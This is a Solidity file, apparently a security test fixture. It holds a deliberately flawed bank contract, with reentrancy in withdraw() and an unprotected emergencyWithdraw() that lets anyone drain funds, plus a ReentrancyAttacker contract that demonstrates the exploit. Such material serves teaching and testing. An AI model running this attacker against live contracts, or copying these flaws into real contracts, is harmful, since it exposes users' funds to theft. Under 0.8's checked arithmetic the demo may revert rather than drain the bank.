// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBank
 * @dev Simple bank contract with intentional vulnerabilities for testing
 *
 * Known vulnerabilities:
 * 1. Reentrancy in withdraw()
 * 2. Integer overflow potential (Solidity <0.8.0 would have this)
 * 3. No access control on critical functions
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    address public owner;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Deposit Ether into the bank
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit positive amount");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev Withdraw Ether from the bank
     * @param amount Amount to withdraw
     *
     * VULNERABILITY: Reentrancy - external call before state update
     */
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABLE: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call (should be before!)
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @dev Get contract balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @dev Emergency withdrawal
     * VULNERABILITY: No access control - anyone can drain the contract!
     */
    function emergencyWithdraw() public {
        uint256 balance = address(this).balance;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Emergency withdrawal failed");
    }
}

/**
 * @title ReentrancyAttacker
 * @dev Example attacker contract demonstrating reentrancy vulnerability
 */
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackAmount;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    function attack() public payable {
        require(msg.value > 0, "Need funds to attack");
        attackAmount = msg.value;

        // Deposit first
        bank.deposit{value: msg.value}();

        // Then withdraw to trigger reentrancy
        bank.withdraw(msg.value);
    }

    // Fallback function - called during withdrawal
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            // Reenter the withdraw function
            bank.withdraw(attackAmount);
        }
    }
}
